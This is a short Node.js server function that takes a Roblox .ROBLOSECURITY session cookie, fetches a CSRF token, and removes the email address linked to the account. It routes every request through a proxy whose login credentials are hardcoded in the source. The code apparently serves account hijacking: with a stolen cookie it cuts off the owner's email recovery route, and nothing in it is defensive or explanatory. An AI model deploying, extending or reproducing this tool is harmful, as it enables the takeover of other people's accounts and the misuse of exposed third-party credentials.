const rp = require("request-promise");

const WEBSHARE_PROXY = "http://hpbhwlum:ifhjayiy2wek@38.154.227.167:5868";

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.writeHead(405, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: "Only POST allowed" }));
  }

  let cookie = req.body.cookie;
  if (!cookie) {
    res.writeHead(400, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: "Missing .ROBLOSECURITY cookie" }));
  }

  cookie = cookie.trim();
  if (cookie.includes(".ROBLOSECURITY=")) {
    cookie = cookie.split(".ROBLOSECURITY=")[1];
  }

  if (cookie.length < 50) {
    res.writeHead(400, { "Content-Type": "application/json" });
    return res.end(
      JSON.stringify({ error: "Invalid .ROBLOSECURITY cookie format" })
    );
  }

  try {
    console.log("🔐 Obtaining CSRF token...");
    const csrfToken = await getCsrfToken(cookie);
    console.log("CSRF Token:", csrfToken);

    console.log("📧 Fetching email info...");
    const emailInfo = await fetchEmail(cookie, csrfToken);
    console.log("Email info:", emailInfo);

    if (!emailInfo || (!emailInfo.emailId && !emailInfo.emailAddress)) {
      res.writeHead(400, { "Content-Type": "application/json" });
      return res.end(
        JSON.stringify({
          error:
            "No email linked or failed to fetch email info",
          debug: emailInfo,
        })
      );
    }

    const emailToDelete = emailInfo.emailId || emailInfo.emailAddress;
    console.log("🗑️ Deleting email:", emailToDelete);
    const result = await deleteEmail(cookie, csrfToken);

    if (result && result.errors && result.errors.length > 0) {
      const error = result.errors[0];
      res.writeHead(403, { "Content-Type": "application/json" });
      return res.end(
        JSON.stringify({
          error:
            error.message || "Challenge required to authorize request",
          code: error.code,
          needsChallenge: true,
        })
      );
    }

    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(
      JSON.stringify({
        success: true,
        message: "Email removal processed successfully",
        result,
      })
    );
  } catch (err) {
    console.error("❌ Error:", err);
    res.writeHead(500, { "Content-Type": "application/json" });
    return res.end(
      JSON.stringify({
        error: err.message || "Unknown server error",
        type: "server_error",
      })
    );
  }
};

// Helper Functions (using proxy)

function getCsrfToken(cookie) {
  return rp({
    method: "POST",
    uri: "https://auth.roblox.com/v2/logout",
    headers: {
      Cookie: `.ROBLOSECURITY=${cookie}`,
    },
    resolveWithFullResponse: true,
    proxy: WEBSHARE_PROXY,
    simple: false,
  }).then((response) => {
    const token = response.headers["x-csrf-token"];
    if (!token) throw new Error("Failed to get CSRF token");
    return token;
  });
}

function fetchEmail(cookie, csrfToken) {
  return rp({
    method: "GET",
    uri: "https://accountsettings.roblox.com/v1/email",
    headers: {
      Cookie: `.ROBLOSECURITY=${cookie}`,
      "X-CSRF-TOKEN": csrfToken,
      Accept: "application/json",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    },
    json: true,
    proxy: WEBSHARE_PROXY,
  });
}

function deleteEmail(cookie, csrfToken) {
  return rp({
    method: "POST",
    uri: "https://accountsettings.roblox.com/v1/email",
    headers: {
      Cookie: `.ROBLOSECURITY=${cookie}`,
      "X-CSRF-TOKEN": csrfToken,
      Accept: "application/json",
      "Content-Type": "application/json",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    },
    body: {
      emailAddress: "",
    },
    json: true,
    proxy: WEBSHARE_PROXY,
    simple: false,
  });
}
